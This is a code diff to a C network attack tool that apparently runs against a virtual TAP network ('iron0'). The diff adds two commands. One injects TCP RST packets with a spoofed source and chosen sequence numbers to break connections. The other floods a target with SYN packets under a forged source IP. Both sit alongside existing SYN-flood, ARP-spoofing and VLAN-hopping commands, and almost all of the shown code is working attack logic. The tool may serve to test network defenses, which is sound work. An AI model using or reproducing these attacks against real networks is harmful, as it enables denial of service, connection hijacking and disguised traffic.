@@ -13,6 +13,8 @@ static void usage(void) {
     fprintf(stderr, "  syn-flood  --target <ip> --port <port> [--rate <pps>] [--count <n>] [--iface <name>]\n");
     fprintf(stderr, "  arp-spoof  --target <ip> --impersonate <ip> [--iface <name>] [--count <n>]\n");
     fprintf(stderr, "  vlan-hop   --target <ip> --target-vlan <vid> [--outer-vlan <vid>] [--iface <name>] [--count <n>]\n");
+    fprintf(stderr, "  rst-inject --target <ip> --port <port> --src <ip> --sport <port> [--seq <n>] [--count <n>] [--iface <name>]\n");
+    fprintf(stderr, "  ip-spoof   --src <ip> --dst <ip> --port <port> [--count <n>] [--iface <name>]\n");
     fprintf(stderr, "\nAll commands require sudo (raw socket access).\n");
 }
 
@@ -209,6 +211,110 @@ static int cmd_vlan_hop(int argc, char **argv) {
     return 0;
 }
 
+static int cmd_rst_inject(int argc, char **argv) {
+    const char *target_str = NULL, *src_str = NULL;
+    const char *iface = "iron0";
+    uint16_t port = 7, sport = 54321;
+    uint32_t seq = 1000;
+    int count = 10;
+
+    for (int i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
+        else if (strcmp(argv[i], "--src") == 0 && i + 1 < argc) src_str = argv[++i];
+        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--sport") == 0 && i + 1 < argc) sport = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--seq") == 0 && i + 1 < argc) seq = (uint32_t)atol(argv[++i]);
+        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
+    }
+
+    if (!target_str || !src_str) {
+        fprintf(stderr, "Error: --target and --src required\n"); return 1;
+    }
+
+    uint32_t dst_ip = parse_ip(target_str);
+    uint32_t src_ip = parse_ip(src_str);
+    if (!dst_ip || !src_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }
+
+    int fd = tap_open(iface);
+    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }
+
+    printf("=== TCP RST Injection ===\n");
+    printf("  Target:  %s:%d\n", target_str, port);
+    printf("  Spoof:   %s:%d\n", src_str, sport);
+    printf("  Seq:     %u\n", seq);
+    printf("  Count:   %d\n\n", count);
+
+    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x03};
+    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+    uint8_t frame[128];
+    int sent = 0;
+
+    for (int i = 0; i < count; i++) {
+        int len = craft_tcp_rst(frame, sizeof(frame),
+                                src_mac, dst_mac,
+                                src_ip, dst_ip,
+                                sport, port, seq + i);
+        if (len > 0) { tap_write(fd, frame, len); sent++; }
+        usleep(10000);
+    }
+
+    printf("  Sent: %d RST packets\n\n", sent);
+    close(fd);
+    return 0;
+}
+
+static int cmd_ip_spoof(int argc, char **argv) {
+    const char *src_str = NULL, *dst_str = NULL;
+    const char *iface = "iron0";
+    uint16_t port = 7;
+    int count = 10;
+
+    for (int i = 0; i < argc; i++) {
+        if (strcmp(argv[i], "--src") == 0 && i + 1 < argc) src_str = argv[++i];
+        else if (strcmp(argv[i], "--dst") == 0 && i + 1 < argc) dst_str = argv[++i];
+        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) port = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
+    }
+
+    if (!src_str || !dst_str) {
+        fprintf(stderr, "Error: --src and --dst required\n"); return 1;
+    }
+
+    uint32_t src_ip = parse_ip(src_str);
+    uint32_t dst_ip = parse_ip(dst_str);
+    if (!src_ip || !dst_ip) { fprintf(stderr, "Invalid IP\n"); return 1; }
+
+    int fd = tap_open(iface);
+    if (fd < 0) { fprintf(stderr, "Error: cannot open '%s'\n", iface); return 1; }
+
+    printf("=== IP Spoofing Attack ===\n");
+    printf("  Spoofed src: %s\n", src_str);
+    printf("  Target:      %s:%d\n", dst_str, port);
+    printf("  Count:       %d\n\n", count);
+
+    uint8_t src_mac[6] = {0x02, 0xAA, 0xBB, 0xCC, 0x00, 0x04};
+    uint8_t dst_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
+    uint8_t frame[128];
+    g_rand_state = (uint32_t)time(NULL);
+    int sent = 0;
+
+    for (int i = 0; i < count; i++) {
+        uint16_t sport = 10000 + (fast_rand() % 55000);
+        int len = craft_tcp_syn(frame, sizeof(frame),
+                                src_mac, dst_mac,
+                                src_ip, dst_ip,
+                                sport, port, fast_rand());
+        if (len > 0) { tap_write(fd, frame, len); sent++; }
+        usleep(10000);
+    }
+
+    printf("  Sent: %d spoofed SYN packets\n\n", sent);
+    close(fd);
+    return 0;
+}
+
 int main(int argc, char **argv) {
     if (argc < 2) {
         usage();
@@ -223,6 +329,10 @@ int main(int argc, char **argv) {
         return cmd_arp_spoof(argc - 2, argv + 2);
     } else if (strcmp(cmd, "vlan-hop") == 0) {
         return cmd_vlan_hop(argc - 2, argv + 2);
+    } else if (strcmp(cmd, "rst-inject") == 0) {
+        return cmd_rst_inject(argc - 2, argv + 2);
+    } else if (strcmp(cmd, "ip-spoof") == 0) {
+        return cmd_ip_spoof(argc - 2, argv + 2);
     } else if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
         usage();
         return 0;
